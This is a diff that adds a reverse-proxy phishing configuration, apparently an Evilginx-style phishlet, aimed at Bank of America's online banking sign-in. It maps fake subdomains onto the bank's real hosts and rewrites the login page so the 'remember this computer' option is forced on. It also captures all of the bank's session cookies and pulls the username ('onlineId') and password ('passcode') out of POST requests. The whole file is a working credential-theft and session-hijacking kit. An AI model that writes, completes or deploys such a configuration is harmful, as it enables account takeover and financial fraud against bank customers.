@@ -1,0 +1,37 @@
+author: ""
+min_ver: "2.3.0"
+proxy_hosts:
+  - { phish_sub: "secure", orig_sub: "secure", domain: "bankofamerica.com", session: true, is_landing: true}
+  - { phish_sub: "aero", orig_sub: "aero", domain: "bankofamerica.com", session: false, is_landing: false}
+  - { phish_sub: "bup", orig_sub: "bup", domain: "bankofamerica.com", session: false, is_landing: false}
+  - { phish_sub: "sofa", orig_sub: "sofa", domain: "bankofamerica.com", session: false, is_landing: false}
+  - { phish_sub: "rail", orig_sub: "rail", domain: "bankofamerica.com", session: false, is_landing: false}
+  - { phish_sub: "boss", orig_sub: "boss", domain: "bankofamerica.com", session: false, is_landing: false}
+  - { phish_sub: "www", orig_sub: "www", domain: "bankofamerica.com", session: false, is_landing: false}
+  - { phish_sub: "origin-bac-assets", orig_sub: "origin-bac-assets", domain: "bankofamerica.com", session: false, is_landing: false}
+  - { phish_sub: "dull", orig_sub: "dull", domain: "bankofamerica.com", session: false, is_landing: false}
+  - { phish_sub: "app.prodcs", orig_sub: "app.prodcs", domain: "bankofamerica.com", session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'secure.bankofamerica.com', orig_sub: 'secure', domain: 'bankofamerica.com', search: "<input type='radio' class='' name='rembComp' id='yes-recognize' value='Y'>", replace: "<input type='radio' class='' name='rembComp' id='yes-recognize' value='Y' checked=''>", mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'secure.bankofamerica.com', orig_sub: 'secure', domain: 'bankofamerica.com', search: "<input type='radio' name='rembComp' class='' id='no-recognize' value='N'>", replace: "<input type='radio' name='rembComp' class='' id='no-recognize' value='N' disabled=''>", mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+auth_tokens:
+  - domain: '.bankofamerica.com'
+    keys: ['.*,regexp']
+  - domain: 'secure.bankofamerica.com'
+    keys: ['.*,regexp']
+auth_urls:
+#  - "/login/sign-in/validateChallengeAnswerV2.go"
+  - "/myaccounts/signin/signIn.go"
+credentials:
+  username:
+    key: 'onlineId'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passcode'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: "secure.bankofamerica.com"
+  path: "/login/sign-in/signOnV2Screen.go"
